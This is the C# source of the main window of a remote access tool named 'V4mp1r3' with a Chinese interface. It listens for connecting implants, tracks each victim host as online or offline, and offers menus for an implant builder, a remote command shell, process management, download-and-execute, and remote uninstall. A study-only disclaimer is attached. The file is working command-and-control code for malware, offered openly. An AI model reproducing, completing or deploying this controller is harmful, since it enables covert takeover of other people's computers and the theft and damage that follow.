using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Net.Sockets;
using System.IO;

namespace V4mp1r3
{
    public partial class frmMain : Form
    {
        public frmMain()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
        }
        TcpListener listener;
        TcpClient client;
        Dictionary<int,TcpClient> clientlist= new Dictionary<int,TcpClient>();
        int port;
        int id = 0;
        private void Form1_Load(object sender, EventArgs e)
        {
            Thread thread1 = new Thread(new ThreadStart(Listener));
            thread1.Start();
        }
        private void Listener()
        {
            string[] a = null;
            try
            {
                a = File.ReadAllLines("Port.txt");
            }
            catch
            {
                MessageBox.Show("配置文件丢失！", "提示");
                Environment.Exit(0);
            }
            try
            {
                port = Int32.Parse(a[0]);
            }
            catch
            {
                MessageBox.Show("监听设置错误！", "提示");
            }
            listener = new TcpListener(port);
            listener.Start();
            while (true)
            {
                client = listener.AcceptTcpClient();
                string address = client.Client.RemoteEndPoint.ToString();
                address = address.Substring(0, address.IndexOf(":"));
                id++;
                listView1.Items.Add(new ListViewItem(new string[] { id.ToString(), address, "在线" }));
                clientlist.Add(id, client);
                Thread thread2 = new Thread(new ParameterizedThreadStart(ServerTest));
                thread2.Start(id);
                MessageBox.Show(address + "上线！", "提示");
            }
        }
        private void ServerTest(object obj)
        {
            while(true)
            {
                try
                {
                    NetworkStream clientStream = clientlist[Int32.Parse(obj.ToString())].GetStream();
                    BinaryWriter bw = new BinaryWriter(clientStream);
                    bw.Write("");
                    Thread.Sleep(5000);
                }
                catch
                {
                    string address = client.Client.RemoteEndPoint.ToString();
                    address = address.Substring(0, address.IndexOf(":"));
                    listView1.Items[Int32.Parse(obj.ToString()) - 1].SubItems[2].Text = "下线";
                    if(listView1.Items[Int32.Parse(obj.ToString()) - 1].SubItems[2].Text == "已断开")
                    {

                    }
                    else
                    {
                        MessageBox.Show("远程主机" + address + "下线！", "提示");
                    }
                    break;
                }
            }
        }

        private void 监听ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            frmListenerSettings frmListenerSettings = new frmListenerSettings();
            frmListenerSettings.ShowDialog();
        }

        private void 服务端生成ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            frmServerMaker frmServerMaker = new frmServerMaker();
            frmServerMaker.ShowDialog();
        }

        private void listView1_MouseUp(object sender, MouseEventArgs e)
        {
            if(e.Button == MouseButtons.Right)
            {
                ListView listView = (ListView)sender;
                ListViewItem item = listView.GetItemAt(e.X, e.Y);
                if (item != null && listView1.SelectedItems[0].SubItems[2].Text != "下线" && listView1.SelectedItems[0].SubItems[2].Text != "已断开")
                {
                    contextMenuStrip1.Show(listView, e.X, e.Y);
                }
            }
        }

        private void 远程终端ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int id;
            id = Int32.Parse(listView1.SelectedItems[0].Text);
            frmCMD frmCMD = new frmCMD(clientlist[id]);
            frmCMD.ShowDialog();
        }

        private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }

        private void 免责声明ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show("仅供学习交流，严禁用于任何违法用途！\n请使用者注意使用环境并遵守国家相关法律法规！\n由于使用不当造成的后果作者不承担任何责任！","免责声明");
        }

        private void v4mp1r3ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            frmV4mp1r3 frmV4mp1r3 = new frmV4mp1r3();
            frmV4mp1r3.ShowDialog();
        }

        private void 断开连接ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int id;
            id = Int32.Parse(listView1.SelectedItems[0].Text);
            try
            {
                NetworkStream clientStream = clientlist[id].GetStream();
                BinaryWriter bw = new BinaryWriter(clientStream);
                bw.Write("disconnect");
            }
            catch
            {
                MessageBox.Show("远程主机已断开连接！", "提示");
            }
            listView1.Items[id - 1].SubItems[2].Text = "已断开";
        }

        private void 卸载ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int id;
            id = Int32.Parse(listView1.SelectedItems[0].Text);
            try
            {
                NetworkStream clientStream = clientlist[id].GetStream();
                BinaryWriter bw = new BinaryWriter(clientStream);
                bw.Write("Del");
            }
            catch
            {
                MessageBox.Show("远程主机已断开连接！", "提示");
            }
        }

        private void 作者ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            frmAuthor frmAuthor = new frmAuthor();
            frmAuthor.ShowDialog();
        }

        private void 文件下载执行ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int id;
            id = Int32.Parse(listView1.SelectedItems[0].Text);
            frmDownloadAndRun frmDownloadAndRun = new frmDownloadAndRun(clientlist[id]);
            frmDownloadAndRun.ShowDialog();
        }

        private void 进程管理ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int id;
            id = Int32.Parse(listView1.SelectedItems[0].Text);
            frmProccessManage frmProccessManage = new frmProccessManage(clientlist[id]);
            frmProccessManage.ShowDialog();
        }
    }
}
